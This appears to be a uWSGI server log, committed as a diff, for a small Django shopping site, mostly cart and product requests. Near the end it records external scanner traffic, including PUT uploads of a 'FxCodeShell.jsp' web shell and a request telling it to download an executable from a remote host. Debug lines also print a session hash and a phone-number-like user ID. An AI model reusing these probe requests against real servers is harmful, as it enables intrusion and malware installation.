+Not Found: /static/img/title1 (8).jpg
+[pid: 11114|app: 0|req: 78/78] 113.87.160.176 () {40 vars in 708 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/title1%20(8).jpg => generated 3984 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/zuiqing.jpg
+[pid: 11114|app: 0|req: 79/79] 113.87.160.176 () {40 vars in 700 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/zuiqing.jpg => generated 3973 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/chop2.png
+[pid: 11114|app: 0|req: 80/80] 119.123.242.52 () {40 vars in 696 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/chop2.png => generated 3967 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/icon_index_11.jpg
+[pid: 11114|app: 0|req: 81/81] 113.87.160.176 () {40 vars in 712 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/icon_index_11.jpg => generated 3991 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/daishu.jpg
+[pid: 11114|app: 0|req: 82/82] 119.123.242.52 () {40 vars in 698 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/daishu.jpg => generated 3970 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/title1 (1).jpg
+[pid: 11114|app: 0|req: 83/83] 119.123.242.52 () {40 vars in 708 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/title1%20(1).jpg => generated 3984 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/7.jpg
+[pid: 11114|app: 0|req: 84/84] 113.87.160.176 () {40 vars in 688 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/7.jpg => generated 3955 bytes in 24 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/logo1.gif
+[pid: 11114|app: 0|req: 85/85] 113.87.160.176 () {40 vars in 696 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/logo1.gif => generated 3967 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /static/img/fenjiu.jpg
+[pid: 11114|app: 0|req: 86/86] 119.123.242.52 () {40 vars in 698 bytes} [Sat Mar 16 21:29:12 2019] GET /static/img/fenjiu.jpg => generated 3970 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 11114|app: 0|req: 87/87] 119.123.242.52 () {40 vars in 620 bytes} [Sat Mar 16 21:29:13 2019] GET /favicon.ico => generated 3940 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 21:29:48 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8040 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x12ce4c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x12ce4c0 pid: 11154 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 11154, cores: 1)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 21:41:23 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8040 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x16054c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x16054c0 pid: 11256 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 11256, cores: 1)
+[pid: 11256|app: 0|req: 1/1] 113.87.160.176 () {44 vars in 698 bytes} [Sat Mar 16 21:43:33 2019] GET /index/ => generated 60066 bytes in 52 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+goods Goods object None None
+[pid: 11256|app: 0|req: 2/2] 119.123.242.52 () {46 vars in 745 bytes} [Sat Mar 16 21:43:54 2019] GET /goods/2/ => generated 32288 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 11256|app: 0|req: 3/3] 119.123.242.52 () {46 vars in 743 bytes} [Sat Mar 16 21:43:57 2019] GET /login/ => generated 2114 bytes in 2 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 11256|app: 0|req: 4/4] 119.123.242.52 () {44 vars in 656 bytes} [Sat Mar 16 21:44:02 2019] GET /favicon.ico => generated 3935 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 11256|app: 0|req: 5/5] 119.123.242.52 () {44 vars in 658 bytes} [Sat Mar 16 21:44:03 2019] GET /favicon.ico => generated 3935 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+bab1a7cbf225f54aef76d546589c4ebd
+[pid: 11256|app: 0|req: 6/6] 119.123.242.52 () {52 vars in 891 bytes} [Sat Mar 16 21:44:19 2019] POST /login/ => generated 0 bytes in 14 msecs (HTTP/1.1 302) 6 headers in 274 bytes (1 switches on core 0)
+[pid: 11256|app: 0|req: 7/7] 119.123.242.52 () {48 vars in 820 bytes} [Sat Mar 16 21:44:19 2019] GET /index/ => generated 60010 bytes in 20 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+goods Goods object bab1a7cbf225f54aef76d546589c4ebd 18813320064
+18813320064
+没有商品或用户
+[pid: 11256|app: 0|req: 8/8] 119.123.242.52 () {46 vars in 789 bytes} [Sat Mar 16 21:44:22 2019] GET /goods/2/ => generated 32321 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 11256|app: 0|req: 9/9] 119.123.242.52 () {46 vars in 750 bytes} [Sat Mar 16 21:44:25 2019] GET /addgoods/2?num=1 => generated 0 bytes in 0 msecs (HTTP/1.1 301) 3 headers in 123 bytes (1 switches on core 0)
+18813320064 2
+[pid: 11256|app: 0|req: 10/10] 119.123.242.52 () {46 vars in 752 bytes} [Sat Mar 16 21:44:25 2019] GET /addgoods/2/?num=1 => generated 20 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064 2
+[pid: 11256|app: 0|req: 11/11] 119.123.242.52 () {46 vars in 752 bytes} [Sat Mar 16 21:44:28 2019] GET /addgoods/2/?num=1 => generated 20 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+{'carts': <QuerySet [<Carts: Carts object>]>, 'num': 1}
+[pid: 11256|app: 0|req: 12/12] 119.123.242.52 () {46 vars in 787 bytes} [Sat Mar 16 21:44:31 2019] GET /carts/ => generated 9042 bytes in 38 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 11256|app: 0|req: 13/13] 119.123.242.52 () {44 vars in 700 bytes} [Sat Mar 16 21:44:31 2019] GET /favicon.ico => generated 3935 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 14/14] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:36 2019] GET /add_carts_goods/?cartsid=72 => generated 36 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 15/15] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:36 2019] GET /add_carts_goods/?cartsid=72 => generated 36 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 16/16] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:36 2019] GET /add_carts_goods/?cartsid=72 => generated 36 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 17/17] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:36 2019] GET /add_carts_goods/?cartsid=72 => generated 36 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 18/18] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:36 2019] GET /add_carts_goods/?cartsid=72 => generated 36 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 19/19] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:37 2019] GET /add_carts_goods/?cartsid=72 => generated 36 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 20/20] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:37 2019] GET /add_carts_goods/?cartsid=72 => generated 36 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 21/21] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:37 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 22/22] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:37 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 23/23] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:37 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 24/24] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:38 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 25/25] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:38 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 26/26] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:38 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 27/27] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:38 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 28/28] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:39 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 29/29] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:39 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 30/30] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:39 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 31/31] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:39 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 32/32] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:39 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 33/33] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:40 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 34/34] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:40 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 35/35] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:40 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 36/36] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:40 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 37/37] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:40 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 38/38] 119.123.242.52 () {46 vars in 770 bytes} [Sat Mar 16 21:44:41 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 39/39] 119.123.242.52 () {46 vars in 788 bytes} [Sat Mar 16 21:44:43 2019] GET /minus_carts_goods/?cartsid=72&num=27 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 40/40] 119.123.242.52 () {46 vars in 788 bytes} [Sat Mar 16 21:44:43 2019] GET /minus_carts_goods/?cartsid=72&num=26 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 41/41] 119.123.242.52 () {46 vars in 788 bytes} [Sat Mar 16 21:44:43 2019] GET /minus_carts_goods/?cartsid=72&num=25 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11256|app: 0|req: 42/42] 119.123.242.52 () {46 vars in 788 bytes} [Sat Mar 16 21:44:44 2019] GET /minus_carts_goods/?cartsid=72&num=24 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 16 21:49:12 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 14:08:22
+os: Linux-4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019
+nodename: Linux
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Mine
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenv/Wine/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Mine
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 1801
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8040 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x7ea4c0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x7ea4c0 pid: 11510 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 11510, cores: 1)
+goods Goods object bab1a7cbf225f54aef76d546589c4ebd 18813320064
+18813320064
+没有商品或用户
+[pid: 11510|app: 0|req: 1/1] 113.87.160.176 () {44 vars in 746 bytes} [Sat Mar 16 21:50:26 2019] GET /goods/2/ => generated 32321 bytes in 94 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+18813320064 2
+[pid: 11510|app: 0|req: 2/2] 113.87.160.176 () {46 vars in 752 bytes} [Sat Mar 16 21:50:29 2019] GET /addgoods/2/?num=1 => generated 21 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064 2
+[pid: 11510|app: 0|req: 3/3] 113.87.160.176 () {46 vars in 752 bytes} [Sat Mar 16 21:50:31 2019] GET /addgoods/2/?num=1 => generated 21 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+{'num': 1, 'carts': <QuerySet [<Carts: Carts object>]>}
+[pid: 11510|app: 0|req: 4/4] 113.87.160.176 () {46 vars in 787 bytes} [Sat Mar 16 21:50:33 2019] GET /carts/ => generated 9043 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 124 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 5/5] 113.87.160.176 () {46 vars in 770 bytes} [Sat Mar 16 21:50:35 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 6/6] 113.87.160.176 () {46 vars in 770 bytes} [Sat Mar 16 21:50:35 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 7/7] 113.87.160.176 () {46 vars in 770 bytes} [Sat Mar 16 21:50:35 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 10 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 8/8] 113.87.160.176 () {46 vars in 770 bytes} [Sat Mar 16 21:50:35 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 9/9] 113.87.160.176 () {46 vars in 770 bytes} [Sat Mar 16 21:50:36 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 10/10] 113.87.160.176 () {46 vars in 770 bytes} [Sat Mar 16 21:50:36 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 11/11] 113.87.160.176 () {46 vars in 770 bytes} [Sat Mar 16 21:50:36 2019] GET /add_carts_goods/?cartsid=72 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 12/12] 113.87.160.176 () {46 vars in 788 bytes} [Sat Mar 16 21:50:37 2019] GET /minus_carts_goods/?cartsid=72&num=32 => generated 37 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 13/13] 113.87.160.176 () {46 vars in 788 bytes} [Sat Mar 16 21:50:37 2019] GET /minus_carts_goods/?cartsid=72&num=31 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 14/14] 113.87.160.176 () {46 vars in 788 bytes} [Sat Mar 16 21:50:38 2019] GET /minus_carts_goods/?cartsid=72&num=30 => generated 37 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 15/15] 113.87.160.176 () {46 vars in 788 bytes} [Sat Mar 16 21:50:38 2019] GET /minus_carts_goods/?cartsid=72&num=29 => generated 37 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 16/16] 113.87.160.176 () {46 vars in 788 bytes} [Sat Mar 16 21:50:38 2019] GET /minus_carts_goods/?cartsid=72&num=28 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 17/17] 113.87.160.176 () {46 vars in 788 bytes} [Sat Mar 16 21:50:38 2019] GET /minus_carts_goods/?cartsid=72&num=27 => generated 37 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+18813320064
+[pid: 11510|app: 0|req: 18/18] 113.87.160.176 () {46 vars in 788 bytes} [Sat Mar 16 21:50:38 2019] GET /minus_carts_goods/?cartsid=72&num=26 => generated 37 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 114 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 19/19] 47.92.155.0 () {34 vars in 458 bytes} [Sat Mar 16 23:10:42 2019] GET / => generated 3884 bytes in 27 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 11510|app: 0|req: 20/20] 47.92.244.152 () {42 vars in 627 bytes} [Sat Mar 16 23:20:43 2019] PUT /FxCodeShell.jsp%20 => generated 3952 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 11510|app: 0|req: 21/21] 47.92.244.152 () {42 vars in 641 bytes} [Sat Mar 16 23:20:43 2019] PUT /FxCodeShell.jsp::$DATA => generated 3968 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 11510|app: 0|req: 22/22] 47.92.244.152 () {42 vars in 623 bytes} [Sat Mar 16 23:20:43 2019] PUT /FxCodeShell.jsp/ => generated 3950 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 11510|app: 0|req: 23/23] 47.92.244.152 () {38 vars in 733 bytes} [Sat Mar 16 23:20:43 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 4027 bytes in 3 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 24/24] 47.101.204.188 () {34 vars in 461 bytes} [Sat Mar 16 23:42:36 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 25/25] 170.81.92.20 () {32 vars in 443 bytes} [Sat Mar 16 23:43:19 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 26/26] 69.70.109.194 () {32 vars in 445 bytes} [Sun Mar 17 01:01:20 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 27/27] 185.53.88.82 () {30 vars in 316 bytes} [Sun Mar 17 01:34:41 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+Not Found: /
+[pid: 11510|app: 0|req: 28/28] 154.217.99.100 () {34 vars in 375 bytes} [Sun Mar 17 03:27:27 2019] GET / => generated 3884 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /cache/global/img/gs.gif
+[pid: 11510|app: 0|req: 29/29] 80.82.70.187 () {32 vars in 414 bytes} [Sun Mar 17 04:21:18 2019] GET /cache/global/img/gs.gif => generated 3971 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 30/30] 2.179.204.194 () {32 vars in 445 bytes} [Sun Mar 17 04:45:12 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /
+[pid: 11510|app: 0|req: 31/31] 109.73.188.198 () {32 vars in 445 bytes} [Sun Mar 17 06:39:56 2019] GET / => generated 3887 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /admin/config.php
+[pid: 11510|app: 0|req: 32/32] 37.49.231.15 () {36 vars in 446 bytes} [Sun Mar 17 06:53:07 2019] GET ///admin/config.php => generated 5711 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 11510|app: 0|req: 33/33] 106.15.76.85 () {26 vars in 261 bytes} [Sun Mar 17 07:41:53 2019] GET / => generated 55017 bytes in 98 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+Not Found: /
